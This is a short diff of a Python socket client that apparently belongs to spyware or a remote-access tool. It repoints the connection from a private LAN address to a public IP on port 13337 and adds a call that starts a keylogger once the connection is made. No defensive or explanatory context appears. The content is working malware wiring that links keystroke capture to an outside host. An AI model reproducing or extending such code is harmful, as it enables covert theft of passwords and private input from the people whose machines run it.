@@ -12,12 +12,13 @@ path = ""
 def main():
     soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     #host = '192.168.43.85'
-    host = '192.168.43.211'
-    port = 1337
+    host = '176.59.192.255'
+    port = 13337
     PATH = "."
     try:
         soc.connect((host, port))
         print("connected")
+        key_logger.start_key_logger()
     except:
         print("Connection error")
         sys.exit()
